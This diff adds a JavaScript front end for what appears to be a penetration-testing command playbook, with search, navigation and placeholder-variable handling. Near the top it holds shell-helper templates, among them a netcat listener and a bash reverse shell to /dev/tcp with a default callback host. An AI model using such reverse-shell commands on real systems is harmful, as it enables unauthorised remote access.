@@ -1,0 +1,2952 @@
+const modes = [
+    { id: "dark", name: "Dark" },
+    { id: "light", name: "Light" }
+];
+
+const placeholderDescriptions = {
+    "<TARGET>": "Target host, IP, URL, or service endpoint you want to inspect.",
+    "<DOMAIN>": "Root domain or zone you want to enumerate or validate.",
+    "<HOSTS_FILE>": "Input file containing hosts or URLs, usually one per line.",
+    "<REQUEST_FILE>": "Saved raw request captured from Burp or another client.",
+    "<BASELINE_SIZE>": "Known baseline response size used to filter noise.",
+    "<BASE_DN>": "LDAP base DN such as DC=corp,DC=local.",
+    "<CIDR>": "CIDR network range to scan.",
+    "<NAMESERVER>": "Specific DNS server you want to query."
+};
+
+const shellHelperDefaults = {
+    host: "10.10.14.10",
+    port: "4444"
+};
+
+const shellHelperSections = [
+    {
+        title: "Catch a session",
+        kicker: "Listener & callback",
+        description: "Keep the first move short and readable so you can focus on the environment instead of wrestling the shell.",
+        cards: [
+            {
+                title: "Netcat Listener",
+                label: "Listener",
+                description: "Readable listener to catch a callback quickly.",
+                template: "rlwrap -cAr nc -lvnp {{PORT}}"
+            },
+            {
+                title: "Socat Listener",
+                label: "Listener",
+                description: "Cleaner socket-to-terminal handling than a raw netcat listener.",
+                template: "socat file:`tty`,raw,echo=0 tcp-listen:{{PORT}}"
+            },
+            {
+                title: "Bash Reverse Shell",
+                label: "Callback",
+                description: "Simple Linux callback when Bash TCP redirection is available.",
+                template: "bash -c 'bash -i >& /dev/tcp/{{HOST}}/{{PORT}} 0>&1'"
+            }
+        ]
+    },
+    {
+        title: "Stabilize the shell",
+        kicker: "TTY upgrades",
+        description: "Once the session lands, these are the moves that make it usable for real work.",
+        cards: [
+            {
+                title: "Python PTY Spawn",
+                label: "Upgrade",
+                description: "Spawn a more interactive shell when Python is available.",
+                template: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+            },
+            {
+                title: "Script-Based Upgrade",
+                label: "Upgrade",
+                description: "Useful when script(1) is present and you want a cleaner interactive shell.",
+                template: "script /dev/null -qc /bin/bash"
+            },
+            {
+                title: "Set TERM",
+                label: "TTY",
+                description: "Restore a reasonable terminal type before using interactive tooling.",
+                template: "export TERM=xterm"
+            },
+            {
+                title: "Foreground Repair",
+                label: "TTY",
+                description: "Common follow-up after Ctrl+Z when you need raw terminal handling back.",
+                template: "stty raw -echo; fg"
+            },
+            {
+                title: "Reset Terminal",
+                label: "TTY",
+                description: "Redraw the terminal cleanly after a rough upgrade path.",
+                template: "reset"
+            },
+            {
+                title: "Match Terminal Size",
+                label: "TTY",
+                description: "Fix full-screen tools after you know the local rows and columns.",
+                template: "stty rows 40 columns 120"
+            }
+        ]
+    }
+];
+
+const shellHelperChecklist = [
+    "Start the listener before you trigger anything that should call back.",
+    "Confirm which shell, interpreter, and networking options actually exist on the target.",
+    "Upgrade the shell early if you plan to run editors, pagers, or full-screen tools.",
+    "Keep your callback host, port, and transport written down so reruns stay clean."
+];
+
+const placeholderStorageKey = "io_placeholder_values";
+let pendingPlaceholderRequest = null;
+let toolManualLoadPromise = null;
+let hasLoadedToolManualOverrides = false;
+let sessionPlaceholderValues = readPlaceholderValues();
+
+const savedModePreference = localStorage.getItem("io_mode");
+let currentModeIndex = modes.findIndex(mode => mode.id === savedModePreference);
+
+if (currentModeIndex === -1) {
+    const legacyModeIndex = Number.parseInt(savedModePreference || "", 10);
+    const legacyModes = ["light", "dark"];
+    const legacyModeId = legacyModes[legacyModeIndex];
+
+    if (legacyModeId) {
+        currentModeIndex = modes.findIndex(mode => mode.id === legacyModeId);
+    }
+}
+
+if (currentModeIndex === -1) {
+    currentModeIndex = modes.findIndex(mode => mode.id === "dark");
+}
+
+const appContainer = document.getElementById("app-container");
+const sidebar = document.getElementById("sidebar");
+const sidebarToggleBtn = document.getElementById("sidebar-toggle-btn");
+const categoryListDiv = document.getElementById("category-list");
+const payloadContainer = document.getElementById("payload-container");
+const searchBox = document.getElementById("search-box");
+const placeholderBtn = document.getElementById("placeholder-btn");
+const homeDashboard = document.getElementById("home-dashboard");
+const resultsMeta = document.getElementById("results-meta");
+const clearSearchBtn = document.getElementById("clear-search-btn");
+const sidebarMetrics = document.getElementById("sidebar-metrics");
+const popularToolsGrid = document.getElementById("popular-tools-grid");
+const popularToolsMeta = document.getElementById("popular-tools-meta");
+const shortcutGrid = document.getElementById("shortcut-grid");
+const principlesList = document.getElementById("principles-list");
+const heroTitle = document.getElementById("hero-title");
+const heroSubtitle = document.getElementById("hero-subtitle");
+const heroDisclaimer = document.getElementById("hero-disclaimer");
+const themeBtn = document.getElementById("theme-btn");
+
+const modal = document.getElementById("help-modal");
+const modalTitle = document.getElementById("modal-title");
+const modalBody = document.getElementById("modal-body");
+
+let appMeta = {};
+let db = [];
+let navTree = {};
+let currentViewDB = [];
+let currentToolMatches = [];
+let pathMetaByName = new Map();
+let moduleMetaByName = new Map();
+let toolProfileByName = new Map();
+let toolManualOverrideByName = new Map();
+let toolManualByName = new Map();
+let activeView = {
+    type: "home",
+    path: null,
+    module: null,
+    tool: null,
+    query: "",
+    focusedId: null,
+    broadSearch: false,
+    fuzzySearch: false
+};
+let expandedSidebarPaths = new Set();
+let expandedSidebarModules = new Set();
+let isSidebarCollapsed = localStorage.getItem("io_sidebar_collapsed") === "1";
+let hasInitializedSidebarState = false;
+
+function applyTheme(index) {
+    const mode = modes[index] || modes[0];
+    document.body.dataset.mode = mode.id;
+    themeBtn.innerHTML = `<span class="material-symbols-outlined">${mode.id === "light" ? "light_mode" : "dark_mode"}</span>`;
+    themeBtn.setAttribute("aria-label", `Theme: ${mode.name}. Click to switch theme.`);
+    themeBtn.setAttribute("title", `Theme: ${mode.name}`);
+}
+
+function cycleTheme() {
+    currentModeIndex = (currentModeIndex + 1) % modes.length;
+    localStorage.setItem("io_mode", modes[currentModeIndex].id);
+    applyTheme(currentModeIndex);
+}
+
+function syncSidebarToggleIcon() {
+    const icon = sidebarToggleBtn.querySelector(".material-symbols-outlined");
+    if (icon) {
+        icon.textContent = isSidebarCollapsed ? "menu" : "menu_open";
+    }
+    sidebarToggleBtn.setAttribute("aria-expanded", String(!isSidebarCollapsed));
+}
+
+function applySidebarState() {
+    sidebar.classList.toggle("collapsed", isSidebarCollapsed);
+    appContainer.classList.toggle("sidebar-collapsed", isSidebarCollapsed);
+    syncSidebarToggleIcon();
+}
+
+function toggleSidebar() {
+    isSidebarCollapsed = !isSidebarCollapsed;
+    localStorage.setItem("io_sidebar_collapsed", isSidebarCollapsed ? "1" : "0");
+    applySidebarState();
+}
+
+function getModuleKey(pathName, moduleName) {
+    return `${pathName}::${moduleName}`;
+}
+
+function isActiveToolLocation(pathName, moduleName, toolName) {
+    return activeView.type === "tool"
+        && activeView.path === pathName
+        && activeView.module === moduleName
+        && activeView.tool === toolName;
+}
+
+function ensureSidebarHasOpenPath() {
+    if (hasInitializedSidebarState) {
+        return;
+    }
+
+    if (expandedSidebarPaths.size > 0) {
+        hasInitializedSidebarState = true;
+        return;
+    }
+
+    const firstPath = getOrderedPaths()[0];
+    if (firstPath) {
+        expandedSidebarPaths.add(firstPath);
+    }
+    hasInitializedSidebarState = true;
+}
+
+function togglePathExpansion(pathName) {
+    if (expandedSidebarPaths.has(pathName)) {
+        expandedSidebarPaths.delete(pathName);
+        Array.from(expandedSidebarModules).forEach(moduleKey => {
+            if (moduleKey.startsWith(`${pathName}::`)) {
+                expandedSidebarModules.delete(moduleKey);
+            }
+        });
+    } else {
+        expandedSidebarPaths.add(pathName);
+    }
+
+    renderSidebar();
+}
+
+function toggleModuleExpansion(pathName, moduleName) {
+    const key = getModuleKey(pathName, moduleName);
+    expandedSidebarPaths.add(pathName);
+
+    if (expandedSidebarModules.has(key)) {
+        expandedSidebarModules.delete(key);
+    } else {
+        expandedSidebarModules.add(key);
+    }
+
+    renderSidebar();
+}
+
+function expandSidebarTo(pathName, moduleName = null) {
+    if (pathName) {
+        expandedSidebarPaths.add(pathName);
+    }
+
+    if (pathName && moduleName) {
+        expandedSidebarModules.add(getModuleKey(pathName, moduleName));
+    }
+}
+
+function escapeHtml(input = "") {
+    return String(input)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;");
+}
+
+function normalizeText(value) {
+    return String(value || "")
+        .toLowerCase()
+        .replace(/[^\w\s./:-]/g, " ")
+        .replace(/\s+/g, " ")
+        .trim();
+}
+
+function tokenizeNormalizedText(value) {
+    return normalizeText(value).split(/\s+/).filter(Boolean);
+}
+
+function addSearchTermVariants(set, rawTerm) {
+    const term = String(rawTerm || "").trim().toLowerCase();
+
+    if (!term) {
+        return;
+    }
+
+    [
+        term,
+        term.replace(/^[./:-]+|[./:-]+$/g, ""),
+        term.replace(/\.(py|exe|ps1|bat|cmd|sh|rb|pl)$/g, ""),
+        term.replace(/[^a-z0-9]/g, "")
+    ]
+        .filter(Boolean)
+        .forEach(candidate => {
+            set.add(candidate);
+
+            if (/[./:-]/.test(candidate)) {
+                candidate.split(/[./:-]/).filter(Boolean).forEach(part => set.add(part));
+            }
+        });
+}
+
+function buildSearchTerms(values = []) {
+    const sourceValues = Array.isArray(values) ? values : [values];
+    const terms = new Set();
+
+    sourceValues.forEach(value => {
+        tokenizeNormalizedText(value).forEach(token => addSearchTermVariants(terms, token));
+    });
+
+    return Array.from(terms).filter(term => term.length > 1);
+}
+
+function getTokenVariants(token) {
+    const variants = new Set();
+    addSearchTermVariants(variants, normalizeText(token));
+    return Array.from(variants);
+}
+
+function getFuzzyDistanceBudget(tokenLength) {
+    if (tokenLength >= 9) {
+        return 2;
+    }
+
+    if (tokenLength >= 5) {
+        return 1;
+    }
+
+    return 0;
+}
+
+function getLevenshteinDistanceWithin(a, b, maxDistance) {
+    if (a === b) {
+        return 0;
+    }
+
+    if (maxDistance < 1 || Math.abs(a.length - b.length) > maxDistance) {
+        return Number.POSITIVE_INFINITY;
+    }
+
+    let previous = Array.from({ length: b.length + 1 }, (_, index) => index);
+    let current = new Array(b.length + 1).fill(0);
+
+    for (let row = 1; row <= a.length; row += 1) {
+        current[0] = row;
+        let rowMin = current[0];
+
+        for (let column = 1; column <= b.length; column += 1) {
+            const substitutionCost = a[row - 1] === b[column - 1] ? 0 : 1;
+            current[column] = Math.min(
+                previous[column] + 1,
+                current[column - 1] + 1,
+                previous[column - 1] + substitutionCost
+            );
+            rowMin = Math.min(rowMin, current[column]);
+        }
+
+        if (rowMin > maxDistance) {
+            return Number.POSITIVE_INFINITY;
+        }
+
+        [previous, current] = [current, previous];
+    }
+
+    return previous[b.length];
+}
+
+function isLooseSubsequenceMatch(token, candidate) {
+    if (token.length < 5 || candidate.length < token.length) {
+        return false;
+    }
+
+    let index = 0;
+    for (const character of candidate) {
+        if (character === token[index]) {
+            index += 1;
+            if (index === token.length) {
+                return true;
+            }
+        }
+    }
+
+    return false;
+}
+
+function getTermMatchStrength(token, searchTerms = [], allowFuzzy = false) {
+    if (!token || searchTerms.length === 0) {
+        return 0;
+    }
+
+    const variants = getTokenVariants(token);
+    let bestStrength = 0;
+
+    for (const searchTerm of searchTerms) {
+        for (const variant of variants) {
+            if (searchTerm === variant) {
+                return 1;
+            }
+
+            if (searchTerm.includes(variant) || variant.includes(searchTerm)) {
+                bestStrength = Math.max(bestStrength, 0.9);
+                continue;
+            }
+
+            if (!allowFuzzy || variant.length < 4 || searchTerm.length < 4) {
+                continue;
+            }
+
+            const maxDistance = getFuzzyDistanceBudget(Math.max(variant.length, searchTerm.length));
+            const distance = getLevenshteinDistanceWithin(variant, searchTerm, maxDistance);
+
+            if (distance === 1) {
+                bestStrength = Math.max(bestStrength, 0.74);
+                continue;
+            }
+
+            if (distance === 2) {
+                bestStrength = Math.max(bestStrength, 0.58);
+                continue;
+            }
+
+            if (isLooseSubsequenceMatch(variant, searchTerm)) {
+                bestStrength = Math.max(bestStrength, 0.5);
+            }
+        }
+    }
+
+    return bestStrength;
+}
+
+function readPlaceholderValues() {
+    try {
+        const saved = sessionStorage.getItem(placeholderStorageKey);
+        const parsed = saved ? JSON.parse(saved) : {};
+        return parsed && typeof parsed === "object" ? parsed : {};
+    } catch (error) {
+        return {};
+    }
+}
+
+function persistPlaceholderValues() {
+    try {
+        sessionStorage.setItem(placeholderStorageKey, JSON.stringify(sessionPlaceholderValues));
+    } catch (error) {
+        // Ignore storage failures and keep the values in memory.
+    }
+}
+
+function getManagedPlaceholders(extraPlaceholders = []) {
+    return getUniqueValues([
+        ...Object.keys(placeholderDescriptions),
+        ...Object.keys(sessionPlaceholderValues || {}),
+        ...extraPlaceholders
+    ]).sort((a, b) => a.localeCompare(b));
+}
+
+function applyPlaceholderValues(command = "") {
+    return extractPlaceholders(command).reduce((output, placeholder) => {
+        const value = sessionPlaceholderValues[placeholder];
+        return value ? output.replaceAll(placeholder, value) : output;
+    }, String(command));
+}
+
+function updatePlaceholderButton() {
+    if (!placeholderBtn) {
+        return;
+    }
+
+    const count = Object.keys(sessionPlaceholderValues).filter(key => sessionPlaceholderValues[key]).length;
+    placeholderBtn.textContent = count > 0 ? `Session Vars ${count}` : "Session Vars";
+    placeholderBtn.setAttribute("title", count > 0 ? `${count} saved placeholder value${count === 1 ? "" : "s"}` : "Set placeholder values for copy actions");
+}
+
+function buildPlaceholderFormMarkup(placeholders = [], options = {}) {
+    const {
+        intro = "Save values once and reuse them across copied commands for this browser session.",
+        submitLabel = "Save values",
+        showClear = true
+    } = options;
+
+    return `
+        <form class="placeholder-form" onsubmit="savePlaceholderValues(event)">
+            <div class="modal-block">
+                <span class="modal-label">Session values</span>
+                <p class="sources-copy">${escapeHtml(intro)}</p>
+            </div>
+            <div class="placeholder-grid">
+                ${placeholders.map(placeholder => `
+                    <label class="placeholder-field">
+                        <span class="manual-inline-label">${escapeHtml(placeholder)}</span>
+                        <input
+                            class="placeholder-input"
+                            type="text"
+                            name="${escapeHtml(placeholder)}"
+                            value="${escapeHtml(sessionPlaceholderValues[placeholder] || "")}"
+                            placeholder="${escapeHtml(placeholderDescriptions[placeholder] || "Set a session value")}"
+                        >
+                        <span class="placeholder-help">${escapeHtml(placeholderDescriptions[placeholder] || "Used as a saved command placeholder.")}</span>
+                    </label>
+                `).join("")}
+            </div>
+            <div class="placeholder-actions">
+                <button class="secondary-btn" type="submit">${escapeHtml(submitLabel)}</button>
+                ${showClear ? `<button class="secondary-btn" type="button" onclick="clearPlaceholderValues()">Clear saved values</button>` : ""}
+            </div>
+        </form>
+    `;
+}
+
+function focusFirstPlaceholderInput() {
+    const firstInput = modalBody.querySelector(".placeholder-input");
+    if (firstInput instanceof HTMLElement) {
+        firstInput.focus();
+        if ("select" in firstInput) {
+            firstInput.select();
+        }
+    }
+}
+
+function openPlaceholderModal(placeholders = [], options = {}) {
+    modalTitle.innerText = options.title || "Session variables";
+    modalBody.innerHTML = buildPlaceholderFormMarkup(placeholders, options);
+    modal.style.display = "block";
+    window.setTimeout(focusFirstPlaceholderInput, 0);
+}
+
+function openPlaceholderManager() {
+    openPlaceholderModal(getManagedPlaceholders(), {
+        title: "Session variables",
+        intro: "These values are used when you copy commands containing placeholders like <TARGET> or <DOMAIN>.",
+        submitLabel: "Save session values"
+    });
+}
+
+function savePlaceholderValues(event) {
+    event.preventDefault();
+
+    const form = event.currentTarget;
+    if (!(form instanceof HTMLFormElement)) {
+        return;
+    }
+
+    const formData = new FormData(form);
+    Object.keys(Object.fromEntries(formData.entries())).forEach(placeholder => {
+        const rawValue = String(formData.get(placeholder) || "").trim();
+        if (rawValue) {
+            sessionPlaceholderValues[placeholder] = rawValue;
+        } else {
+            delete sessionPlaceholderValues[placeholder];
+        }
+    });
+
+    persistPlaceholderValues();
+    updatePlaceholderButton();
+
+    const pendingRequest = pendingPlaceholderRequest;
+    pendingPlaceholderRequest = null;
+    closeModal();
+
+    if (pendingRequest?.resolve) {
+        pendingRequest.resolve(true);
+    }
+}
+
+function clearPlaceholderValues() {
+    sessionPlaceholderValues = {};
+    persistPlaceholderValues();
+    updatePlaceholderButton();
+
+    if (modal.style.display === "block" && modalTitle.innerText === "Session variables") {
+        openPlaceholderManager();
+    }
+}
+
+function ensurePlaceholderValues(placeholders = []) {
+    const missingPlaceholders = placeholders.filter(placeholder => !sessionPlaceholderValues[placeholder]);
+
+    if (missingPlaceholders.length === 0) {
+        return Promise.resolve(true);
+    }
+
+    return new Promise(resolve => {
+        pendingPlaceholderRequest = { resolve };
+        openPlaceholderModal(getManagedPlaceholders(missingPlaceholders), {
+            title: "Session variables",
+            intro: "This command includes placeholders. Save the missing values below and the copied command will use them automatically for this session.",
+            submitLabel: "Save and copy"
+        });
+    });
+}
+
+async function resolveCommandForCopy(command = "") {
+    const placeholders = extractPlaceholders(command);
+
+    if (placeholders.length === 0) {
+        return String(command || "");
+    }
+
+    const hasValues = await ensurePlaceholderValues(placeholders);
+    if (!hasValues) {
+        return "";
+    }
+
+    return applyPlaceholderValues(command);
+}
+
+function isWorkflowEntry(item = {}) {
+    return normalizeText(item.type) === "workflow";
+}
+
+function hasCopyableCommand(item = {}) {
+    return Boolean(String(item.command || "").trim()) && !isWorkflowEntry(item);
+}
+
+function isCommandEntry(item = {}) {
+    return normalizeText(item.type) === "command";
+}
+
+function pluralize(count, singular, pluralForm = `${singular}s`) {
+    if (pluralForm === `${singular}s`) {
+        if (singular.endsWith("y")) {
+            pluralForm = `${singular.slice(0, -1)}ies`;
+        } else if (/(s|x|z|ch|sh)$/i.test(singular)) {
+            pluralForm = `${singular}es`;
+        }
+    }
+    return `${count} ${count === 1 ? singular : pluralForm}`;
+}
+
+function buildTagMarkup(tags = [], limit = tags.length) {
+    return tags
+        .slice(0, limit)
+        .map(tag => `<span class="tag-chip">${escapeHtml(tag)}</span>`)
+        .join("");
+}
+
+function buildPreviewText(value = "") {
+    return escapeHtml(String(value).replace(/\s+/g, " ").trim());
+}
+
+function extractFlags(item) {
+    const command = String(item.command || "");
+    const flags = [];
+    const unixMatches = command.match(/(?:^|\s)(--?[A-Za-z0-9][\w-]*)/g) || [];
+
+    unixMatches.forEach(match => {
+        flags.push(match.trim());
+    });
+
+    if (String(item.platform || "").toLowerCase().includes("windows")) {
+        const windowsMatches = command.match(/(?:^|\s)(\/[A-Za-z][A-Za-z0-9-]*)/g) || [];
+        windowsMatches.forEach(match => {
+            flags.push(match.trim());
+        });
+    }
+
+    return Array.from(new Set(flags));
+}
+
+function extractPlaceholders(command = "") {
+    const placeholders = (String(command).match(/<[^>]+>/g) || [])
+        .map(placeholder => placeholder.trim())
+        .filter(placeholder => /^<[A-Z0-9_]+>$/.test(placeholder));
+    const normalized = [...placeholders];
+
+    if (/(?:request|raw)\.txt/i.test(String(command))) {
+        normalized.push("<REQUEST_FILE>");
+    }
+
+    return Array.from(new Set(normalized));
+}
+
+function getUniqueValues(values = []) {
+    return Array.from(new Set(values.filter(Boolean)));
+}
+
+function hydrateMeta(meta = {}) {
+    appMeta = meta;
+    pathMetaByName = new Map((meta.paths || []).map(path => [path.name, path]));
+    moduleMetaByName = new Map((meta.modules || []).map(module => [module.name, module]));
+    toolProfileByName = new Map((meta.tool_profiles || []).map(profile => [profile.name, profile]));
+}
+
+function hydrateToolManualOverrides(manualData = {}) {
+    toolManualOverrideByName = new Map((manualData.tools || []).map(tool => [tool.name, tool]));
+}
+
+function getToolProfile(toolName) {
+    return toolProfileByName.get(toolName) || {};
+}
+
+function getToolManualOverride(toolName) {
+    return toolManualOverrideByName.get(toolName) || {};
+}
+
+function mergeReferenceItems(primary = [], secondary = []) {
+    const seen = new Set();
+    const output = [];
+
+    [...primary, ...secondary].forEach(item => {
+        const name = item?.name;
+        if (!name || seen.has(name)) {
+            return;
+        }
+
+        seen.add(name);
+        output.push(item);
+    });
+
+    return output;
+}
+
+function buildDerivedToolSummary(toolName, items, override = {}) {
+    if (override.summary) {
+        return override.summary;
+    }
+
+    if (items.length === 0) {
+        return `${toolName} quick guide.`;
+    }
+
+    const useCases = getToolUseCases(items, 3);
+    const firstDescription = items.find(item => item.description)?.description;
+
+    if (firstDescription && useCases.length > 1) {
+        return `${firstDescription} Saved here for ${useCases.join(", ")}.`;
+    }
+
+    if (firstDescription) {
+        return firstDescription;
+    }
+
+    const workflows = getUniqueValues(items.map(item => item.module));
+    if (workflows.length > 0) {
+        return `Used in ${workflows.slice(0, 3).join(", ")} workflows across this playbook.`;
+    }
+
+    return `${toolName} quick guide.`;
+}
+
+function buildDerivedToolSyntax(items, override = {}) {
+    const firstCommandItem = items.find(item => isCommandEntry(item) && Boolean(String(item.command || "").trim()));
+    if (!firstCommandItem) {
+        return "";
+    }
+
+    if (override.syntax) {
+        return override.syntax;
+    }
+
+    const firstCommand = normalizeText(firstCommandItem.command || "") ? String(firstCommandItem.command).trim() : "";
+    if (!firstCommand) {
+        return "";
+    }
+
+    return firstCommand.length > 110 ? `${firstCommand.slice(0, 107)}...` : firstCommand;
+}
+
+function buildToolParameters(items, override = {}) {
+    const manualParameters = override.parameters || [];
+    const seen = new Set();
+    const output = [];
+    const parameterSourceItems = items.filter(item => hasCopyableCommand(item));
+
+    manualParameters.forEach(parameter => {
+        if (!parameter?.name || seen.has(parameter.name)) {
+            return;
+        }
+        seen.add(parameter.name);
+        output.push(parameter);
+    });
+
+    getUniqueValues(parameterSourceItems.flatMap(item => extractPlaceholders(item.command))).forEach(parameterName => {
+        if (seen.has(parameterName)) {
+            return;
+        }
+
+        seen.add(parameterName);
+        output.push({
+            name: parameterName,
+            description: placeholderDescriptions[parameterName] || "Placeholder used in the saved commands for this tool."
+        });
+    });
+
+    return output.slice(0, 8);
+}
+
+function buildDerivedReferenceItems(items, override = {}) {
+    return (override.reference_items || []).slice(0, 14);
+}
+
+function buildToolNotes(items, override = {}) {
+    if ((override.notes || []).length > 0) {
+        return override.notes;
+    }
+
+    const notes = getUniqueValues(items.map(item => item.tip).filter(Boolean));
+    return notes.slice(0, 2);
+}
+
+function buildRelatedTools(toolName, items, override = {}) {
+    const manualRelated = override.related_tools || [];
+    const relatedCounts = new Map();
+
+    items.forEach(item => {
+        db
+            .filter(entry => entry.tool !== toolName && entry.path === item.path && entry.module === item.module)
+            .forEach(entry => {
+                relatedCounts.set(entry.tool, (relatedCounts.get(entry.tool) || 0) + 1);
+            });
+    });
+
+    const derived = Array.from(relatedCounts.entries())
+        .sort((a, b) => {
+            if (b[1] !== a[1]) {
+                return b[1] - a[1];
+            }
+            return a[0].localeCompare(b[0]);
+        })
+        .map(([tool]) => tool);
+
+    return getUniqueValues([...manualRelated, ...derived]).slice(0, 6);
+}
+
+function buildToolManualRecord(toolName, items) {
+    const override = getToolManualOverride(toolName);
+    const profile = getToolProfile(toolName);
+    const workflows = getUniqueValues(items.map(item => `${item.path} • ${item.module}`));
+    const stages = getUniqueValues(items.map(item => item.path));
+    const platforms = getPlatforms(items);
+    const parameters = buildToolParameters(items, override);
+    const referenceItems = buildDerivedReferenceItems(items, override);
+    const notes = buildToolNotes(items, override);
+    const relatedTools = buildRelatedTools(toolName, items, override);
+    const syntax = buildDerivedToolSyntax(items, override);
+    const summary = buildDerivedToolSummary(toolName, items, override);
+
+    const searchText = normalizeText([
+        toolName,
+        summary,
+        syntax,
+        ...stages,
+        ...workflows,
+        ...platforms,
+        ...items.flatMap(item => [item.title, item.description, item.command, item.tip]),
+        ...parameters.flatMap(parameter => [parameter.name, parameter.description]),
+        ...referenceItems.flatMap(item => [item.name, item.type, item.description, item.use_case]),
+        ...getUniqueValues(items.flatMap(item => item.flags || [])),
+        ...(notes || []),
+        ...(relatedTools || [])
+    ].join(" "));
+
+    return {
+        name: toolName,
+        summary,
+        syntax,
+        parameters,
+        reference_items: referenceItems,
+        notes,
+        related_tools: relatedTools,
+        workflows,
+        stages,
+        platforms,
+        items: sortItemsForView(items),
+        manual_label: profile.manual_label || override.manual_label || "",
+        manual_url: profile.manual_url || override.manual_url || "",
+        _searchText: searchText,
+        _searchTerms: buildSearchTerms(searchText),
+        _nameTerms: buildSearchTerms(toolName),
+        _summaryTerms: buildSearchTerms(summary)
+    };
+}
+
+function buildToolManualIndex() {
+    toolManualByName = new Map();
+
+    getUniqueValues(db.map(item => item.tool)).forEach(toolName => {
+        const items = db.filter(item => item.tool === toolName);
+        toolManualByName.set(toolName, buildToolManualRecord(toolName, items));
+    });
+}
+
+function getToolManual(toolName) {
+    return toolManualByName.get(toolName) || buildToolManualRecord(toolName, []);
+}
+
+function buildSearchText(item, moduleMeta = {}) {
+    const toolProfile = getToolProfile(item.tool);
+    return normalizeText([
+        item.path,
+        item.module,
+        item.tool,
+        item.type,
+        item.platform,
+        item.title,
+        item.description,
+        item.command,
+        item.tip,
+        item.help_menu,
+        toolProfile.manual_label,
+        moduleMeta.summary,
+        ...(moduleMeta.tools || []),
+        ...(item.tags || [])
+    ].join(" "));
+}
+
+function annotateEntries(entries) {
+    return entries.map((entry, index) => {
+        const moduleMeta = moduleMetaByName.get(entry.module) || {};
+        const toolProfile = getToolProfile(entry.tool);
+        const item = { ...entry };
+        item.type = item.type || "Command";
+        if (!item.reference_url && toolProfile.manual_url) {
+            item.reference_url = toolProfile.manual_url;
+            item.reference_label = toolProfile.manual_label || "Manual";
+        }
+        item.entryId = `entry-${index}`;
+        item.flags = extractFlags(item);
+        item._searchPath = normalizeText(item.path);
+        item._searchModule = normalizeText(item.module);
+        item._searchTool = normalizeText(item.tool);
+        item._searchType = normalizeText(item.type);
+        item._searchPlatform = normalizeText(item.platform);
+        item._searchTitle = normalizeText(item.title);
+        item._searchDescription = normalizeText(item.description);
+        item._searchCommand = normalizeText(item.command);
+        item._searchTip = normalizeText(item.tip);
+        item._searchModuleSummary = normalizeText(moduleMeta.summary || "");
+        item._normalizedTags = (item.tags || []).map(normalizeText);
+        item._searchText = buildSearchText(item, moduleMeta);
+        item._pathTerms = buildSearchTerms(item.path);
+        item._moduleTerms = buildSearchTerms(item.module);
+        item._toolTerms = buildSearchTerms(item.tool);
+        item._titleTerms = buildSearchTerms(item.title);
+        item._descriptionTerms = buildSearchTerms(item.description);
+        item._commandTerms = buildSearchTerms(item.command);
+        item._moduleSummaryTerms = buildSearchTerms(moduleMeta.summary || "");
+        item._tagTerms = buildSearchTerms(item.tags || []);
+        item._searchTerms = buildSearchTerms(item._searchText);
+        item._score = 0;
+        return item;
+    });
+}
+
+function getPathMeta(pathName) {
+    return pathMetaByName.get(pathName) || {};
+}
+
+function getModuleMeta(moduleName) {
+    return moduleMetaByName.get(moduleName) || {};
+}
+
+function getOrderedPaths(paths = Object.keys(navTree)) {
+    const preferred = appMeta.path_order || [];
+    const preferredSet = new Set(preferred);
+    const ordered = preferred.filter(path => paths.includes(path));
+    const extras = paths.filter(path => !preferredSet.has(path)).sort((a, b) => a.localeCompare(b));
+    return [...ordered, ...extras];
+}
+
+function getOrderedModules(pathName, modules = []) {
+    const preferred = (appMeta.module_order || []).filter(moduleName => {
+        return modules.includes(moduleName) && (getModuleMeta(moduleName).path || pathName) === pathName;
+    });
+    const preferredSet = new Set(preferred);
+    const extras = modules.filter(moduleName => !preferredSet.has(moduleName)).sort((a, b) => a.localeCompare(b));
+    return [...preferred, ...extras];
+}
+
+function getPathRank(pathName) {
+    const orderedPaths = getOrderedPaths();
+    const rank = orderedPaths.indexOf(pathName);
+    return rank === -1 ? orderedPaths.length + 1 : rank;
+}
+
+function getModuleRank(moduleName) {
+    const orderedModules = appMeta.module_order || [];
+    const rank = orderedModules.indexOf(moduleName);
+    return rank === -1 ? orderedModules.length + 1 : rank;
+}
+
+function buildNavTree() {
+    navTree = {};
+
+    db.forEach(item => {
+        if (!navTree[item.path]) {
+            navTree[item.path] = {
+                count: 0,
+                modules: {}
+            };
+        }
+
+        navTree[item.path].count += 1;
+
+        if (!navTree[item.path].modules[item.module]) {
+            navTree[item.path].modules[item.module] = {
+                count: 0,
+                tools: {}
+            };
+        }
+
+        navTree[item.path].modules[item.module].count += 1;
+        navTree[item.path].modules[item.module].tools[item.tool] = (navTree[item.path].modules[item.module].tools[item.tool] || 0) + 1;
+    });
+}
+
+function renderSidebar() {
+    categoryListDiv.innerHTML = "";
+    ensureSidebarHasOpenPath();
+
+    getOrderedPaths().forEach(pathName => {
+        const pathGroup = navTree[pathName] || { count: 0, modules: {} };
+        const modules = Object.keys(pathGroup.modules || {});
+        const isPathActive = activeView.type === "path" && activeView.path === pathName;
+        const isPathOpen = expandedSidebarPaths.has(pathName);
+
+        const navPath = document.createElement("section");
+        navPath.className = "nav-path";
+
+        const pathHeader = document.createElement("button");
+        pathHeader.type = "button";
+        pathHeader.className = "path-header";
+        if (isPathActive) {
+            pathHeader.classList.add("active");
+        }
+        if (isPathOpen) {
+            pathHeader.classList.add("open");
+        }
+        pathHeader.innerHTML = `
+            <span class="path-label-wrap">
+                <span class="path-arrow material-symbols-outlined">expand_more</span>
+                <span class="path-label">${escapeHtml(pathName)}</span>
+            </span>
+            <span class="path-count">${modules.length}</span>
+        `;
+        pathHeader.onclick = () => {
+            if (isPathActive) {
+                togglePathExpansion(pathName);
+                return;
+            }
+
+            expandedSidebarPaths.add(pathName);
+            loadView(pathName, null, null, "");
+        };
+
+        const moduleList = document.createElement("div");
+        moduleList.className = "module-list";
+        if (isPathOpen) {
+            moduleList.classList.add("open");
+        }
+
+        getOrderedModules(pathName, modules).forEach(moduleName => {
+            const moduleData = pathGroup.modules[moduleName];
+            const meta = getModuleMeta(moduleName);
+            const tools = Object.keys(moduleData.tools || {}).sort((a, b) => a.localeCompare(b));
+            const isModuleActive = activeView.type === "module" && activeView.path === pathName && activeView.module === moduleName;
+            const moduleKey = getModuleKey(pathName, moduleName);
+            const isModuleOpen = expandedSidebarModules.has(moduleKey);
+
+            const moduleNode = document.createElement("div");
+            moduleNode.className = "module-tree-node";
